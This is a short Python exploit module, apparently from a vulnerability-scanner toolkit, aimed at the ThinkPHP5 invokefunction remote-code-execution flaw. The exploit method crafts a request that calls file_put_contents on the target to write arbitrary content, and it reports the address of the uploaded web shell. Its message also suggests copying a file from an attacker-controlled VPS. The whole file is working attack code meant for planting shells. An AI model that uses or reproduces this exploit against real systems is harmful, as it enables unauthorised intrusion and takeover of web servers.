# -*- coding:utf-8 -*-
# Thinkphp5命令执行
from VulnScanModel.models import VulnScan
import html

from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def exp(self, cmd, content=""):
        url = self.vuln.url + r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][1]=%s&vars[1][2]=%s" % (
            cmd, html.unescape(content))
        print(content)
        print(url)
        resp = self.requestUtil.get(url)
        return f"文件上传成功, shell地址:\n{self.vuln.url}/{cmd}\n(如解析失败，可使用 copy('vps_file', 'target_file') 上传)"
